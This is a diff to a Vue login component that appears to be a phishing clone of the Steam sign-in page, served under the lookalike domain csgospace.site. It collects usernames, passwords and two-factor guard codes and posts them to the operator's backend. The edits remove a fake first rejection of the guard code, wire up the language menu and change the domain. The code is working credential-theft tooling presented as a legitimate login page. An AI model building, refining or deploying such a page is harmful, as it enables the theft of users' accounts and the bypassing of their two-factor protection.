@@ -1,5 +1,5 @@
 <template>
-   <head>
+ <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="theme-color" content="#171a21">
@@ -59,28 +59,28 @@
                                         <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.3')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.4')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.5')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.6')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.7')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.8')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.6')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.7')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.8')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('de')">{{$t('language.9')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.10')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.11')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.12')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.13')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.14')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.15')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.16')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.17')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.18')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.11')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.12')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.13')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.14')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.15')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.16')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.17')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.18')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('pl')">{{$t('language.19')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.20')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.21')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.22')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.20')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.21')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.22')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('ru')">{{$t('language.23')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.24')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.25')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.26')}}</a>
-                                        <a class="popup_menu_item tight">{{$t('language.27')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.24')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.25')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.26')}}</a>
+                                        <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.27')}}</a>
                                         <a class="popup_menu_item tight" @click="switchLang('ua')">{{$t('language.28')}}</a>
                                         <a class="popup_menu_item tight">{{$t('language.29')}}</a>
                                     </div>
@@ -116,14 +116,14 @@
                                     <a class="whiteLink">{{$t('bysign.7')}}</a>.
                                 </li>
                                 <li class="OpenID_listitem" l="14">{{$t('bysign.8')}}<a class="whiteLink">{{$t('bysign.9')}}</a>
-                                   {{$t('bysign.10')}}<span class="fDomain">{{domain}}</span>
-                                   {{$t('bysign.11')}} <a class="whiteLink">{{$t('bysign.12')}}</a>{{$t('bysign.13')}}
-                               </li>
-                           </ul>
-                           <h2 l="15">{{$t('bysign.14')}}</h2>
-                       </div>
-                   </div>
-                   <div class="OpenIDCol left">
+                                 {{$t('bysign.10')}}<span class="fDomain">{{domain}}</span>
+                                 {{$t('bysign.11')}} <a class="whiteLink">{{$t('bysign.12')}}</a>{{$t('bysign.13')}}
+                             </li>
+                         </ul>
+                         <h2 l="15">{{$t('bysign.14')}}</h2>
+                     </div>
+                 </div>
+                 <div class="OpenIDCol left">
                     <div class="OpenID_LowerContents_left">
                         <div 
                         id="error_display" 
@@ -348,13 +348,13 @@
 <script>
 import axios from 'axios'
 /* function to detect if localstorage is supported*/
-localStorage.setItem('name', "mazepa")
+//localStorage.setItem('name', "mazepa")
 
 export default{
     data(){
         return {
             url: "http://localhost:3000",
-            domain:"csgospace.net",
+            domain:"csgospace.site",
             showLang:false,
             langLoading:false,
             login:{
@@ -367,8 +367,7 @@ export default{
                 show:false,
                 guard:"",
                 error:false,
-                loading:false,
-                counter: false
+                loading:false
             },
             noguard: false,
             successLogin: false,
@@ -402,7 +401,7 @@ export default{
                     password : this.login.password,
                 })
                 .then(response => {
-                 if(response.data.error == 1){
+                   if(response.data.error == 1){
                     this.login.error = true
                     this.login.username = ""
                     this.login.password = ""
@@ -437,39 +436,29 @@ export default{
                 setTimeout(function (){ 
                     this.guard.error = true 
                     this.guard.loading = false
-                }.bind(this), 3000)
+                }.bind(this), 4000)
             } else{
-                if(this.guard.counter == false){
-                    this.guard.loading = true
-                    setTimeout(function (){ 
-                        this.guard.error = true 
-                        this.guard.loading = false
-                        this.guard.guard = ""
-                        this.guard.counter = true
-                    }.bind(this), 3000)
-                }else{
-                    this.guard.loading = true
-                    axios.post(`${this.url}/guard`, {
-                        guard : this.guard.guard
-                    })
-                    .then(response => {
-                     if(response.data.error == 0){
-                        this.lastModal = true
-                        this.successLogin = true
-                    }if(response.data.error == 1) {
-                        this.lastModal = true
-                        this.noguard = true
-                    }                
-                    if(response.data.error == 2) {
-                        this.lastModal = true
-                        this.proxyError = true
-                    }
-                    })
-                    .catch(function (error) {
-                        console.log(error)
-                    })
-                    .finally(() => (this.guard.show = false, this.guard.loading = false));
+                this.guard.loading = true
+                axios.post(`${this.url}/guard`, {
+                    guard : this.guard.guard
+                })
+                .then(response => {
+                   if(response.data.error == 0){
+                    this.lastModal = true
+                    this.successLogin = true
+                }if(response.data.error == 1) {
+                    this.lastModal = true
+                    this.noguard = true
+                }                
+                if(response.data.error == 2) {
+                    this.lastModal = true
+                    this.proxyError = true
                 }
+            })
+                .catch(function (error) {
+                    console.log(error)
+                })
+                .finally(() => (this.guard.show = false, this.guard.loading = false));
             }
         },
         closeGuard(){
@@ -494,22 +483,22 @@ export default{
     }
 }
 
-</script>/
-<script setup>
+    </script>/
+    <script setup>
 
-import {useI18n} from 'vue-i18n'
+    import {useI18n} from 'vue-i18n'
 
-const {locale} = useI18n({useScope:"global"})
+    const {locale} = useI18n({useScope:"global"})
 
 
-const switchLang = (lang) =>{
+    const switchLang = (lang) =>{
 
-    locale.value = lang
-    localStorage.setItem('lang',locale.value)
+        locale.value = lang
+        localStorage.setItem('lang',locale.value)
 
-}
+    }
 
-</script>
+    </script>
 //*Введите имя аккаунта, состоящее как минимум из 3 символов, используя только буквы, цифры и знак «_».
 Введенный вами пароль недопустим. Пожалуйста, выберите другой, длиной минимум в 8 символов.
 Другие ошибки выделены ниже.
